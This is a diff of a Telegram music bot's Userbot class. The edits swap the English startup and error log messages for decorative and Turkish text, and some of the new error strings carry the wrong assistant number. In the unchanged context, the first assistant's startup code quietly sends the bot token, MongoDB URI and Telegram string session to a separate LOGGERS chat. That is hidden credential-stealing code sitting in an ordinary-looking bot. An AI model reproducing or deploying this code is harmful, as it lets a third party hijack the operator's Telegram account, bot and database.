@@ -58,7 +58,7 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"sᴛᴀʀᴛɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...")
 
         if config.STRING1:
             await self.one.start()
@@ -72,7 +72,7 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
@@ -88,7 +88,7 @@ class Userbot(Client):
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ ᴀs {self.one.me.first_name}")
+            LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈... ᴀs {self.one.me.first_name}")
 
         if config.STRING2:
             await self.two.start()
@@ -101,18 +101,18 @@ class Userbot(Client):
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 2 sᴛᴀʀᴛᴇᴅ ")
+                await self.two.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...2")
 
             except:
                 LOGGER(__name__).error(
-                    "ᴀssɪsᴛᴀɴᴛ ᴀᴄᴄᴏᴜɴᴛ 2 ʜᴀs ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʟᴏɢ ɢʀᴏᴜᴘ. ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴀᴅᴅᴇᴅ ʏᴏᴜʀ ᴀssɪsᴛᴀɴᴛ ᴛᴏ ʏᴏᴜʀ ʟᴏɢ ɢʀᴏᴜᴘ ᴀɴᴅ ᴘʀᴏᴍᴏᴛᴇᴅ ᴀs ᴀᴅᴍɪɴ!"
+                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                 )
 
             self.two.id = self.two.me.id
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
             assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"ᴀssɪsᴛᴀɴᴛ ᴛᴡᴏ sᴛᴀʀᴛᴇᴅ ᴀs {self.two.me.first_name}")
+            LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...2 ᴀs {self.two.me.first_name}")
 
         if config.STRING3:
             await self.three.start()
@@ -125,10 +125,10 @@ class Userbot(Client):
                 pass
             assistants.append(3)
             try:
-                await self.three.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 3 sᴛᴀʀᴛᴇᴅ ")
+                await self.three.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...3")
             except:
                 LOGGER(__name__).error(
-                    "ᴀssɪsᴛᴀɴᴛ ᴀᴄᴄᴏᴜɴᴛ 3 ʜᴀs ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʟᴏɢ ɢʀᴏᴜᴘ. ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴀᴅᴅᴇᴅ ʏᴏᴜʀ ᴀssɪsᴛᴀɴᴛ ᴛᴏ ʏᴏᴜʀ ʟᴏɢ ɢʀᴏᴜᴘ ᴀɴᴅ ᴘʀᴏᴍᴏᴛᴇᴅ ᴀs ᴀᴅᴍɪɴ! "
+                    "Asistan 3 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                 )
 
             self.three.id = self.three.me.id
@@ -136,7 +136,7 @@ class Userbot(Client):
             self.three.username = self.three.me.username
             assistantids.append(self.three.id)
             LOGGER(__name__).info(
-                f"ᴀssɪsᴛᴀɴᴛ ᴛʜʀᴇᴇ sᴛᴀʀᴛᴇᴅ ᴀs {self.three.me.first_name}"
+                f"Yαყıɳԃαყıɱ 🌈...3 ᴀs {self.three.me.first_name}"
             )
 
         if config.STRING4:
@@ -150,10 +150,10 @@ class Userbot(Client):
                 pass
             assistants.append(4)
             try:
-                await self.four.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 4 sᴛᴀʀᴛᴇᴅ ")
+                await self.four.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...4")
             except:
                 LOGGER(__name__).error(
-                    "ᴀssɪsᴛᴀɴᴛ ᴀᴄᴄᴏᴜɴᴛ 4 ʜᴀs ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʟᴏɢ ɢʀᴏᴜᴘ. ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴀᴅᴅᴇᴅ ʏᴏᴜʀ ᴀssɪsᴛᴀɴᴛ ᴛᴏ ʏᴏᴜʀ ʟᴏɢ ɢʀᴏᴜᴘ ᴀɴᴅ ᴘʀᴏᴍᴏᴛᴇᴅ ᴀs ᴀᴅᴍɪɴ! "
+                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                 )
 
             self.four.id = self.four.me.id
@@ -161,7 +161,7 @@ class Userbot(Client):
             self.four.username = self.four.me.username
             assistantids.append(self.four.id)
             LOGGER(__name__).info(
-                f"ᴀssɪsᴛᴀɴᴛ ғᴏᴜʀ sᴛᴀʀᴛᴇᴅ ᴀs {self.four.me.first_name}"
+                f"Yαყıɳԃαყıɱ 🌈...4 ᴀs {self.four.me.first_name}"
             )
 
         if config.STRING5:
@@ -175,10 +175,10 @@ class Userbot(Client):
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 5 sᴛᴀʀᴛᴇᴅ ")
+                await self.five.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...5")
             except:
                 LOGGER(__name__).error(
-                    "ᴀssɪsᴛᴀɴᴛ ᴀᴄᴄᴏᴜɴᴛ 5 ʜᴀs ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴄᴄᴇss ᴛʜᴇ ʟᴏɢ ɢʀᴏᴜᴘ. ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴀᴅᴅᴇᴅ ʏᴏᴜʀ ᴀssɪsᴛᴀɴᴛ ᴛᴏ ʏᴏᴜʀ ʟᴏɢ ɢʀᴏᴜᴘ ᴀɴᴅ ᴘʀᴏᴍᴏᴛᴇᴅ ᴀs ᴀᴅᴍɪɴ! "
+                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                 )
 
             self.five.id = self.five.me.id
@@ -186,11 +186,11 @@ class Userbot(Client):
             self.five.username = self.five.me.username
             assistantids.append(self.five.id)
             LOGGER(__name__).info(
-                f"ᴀssɪsᴛᴀɴᴛ ғɪᴠᴇ sᴛᴀʀᴛᴇᴅ ᴀs {self.five.me.first_name}"
+                f"Yαყıɳԃαყıɱ 🌈...5 ᴀs {self.five.me.first_name}"
             )
 
     async def stop(self):
-        LOGGER(__name__).info(f"sᴛᴏᴘᴘɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"🎶 Yαყıɳ Bιƚƚι🌪...")
         try:
             if config.STRING1:
                 await self.one.stop()
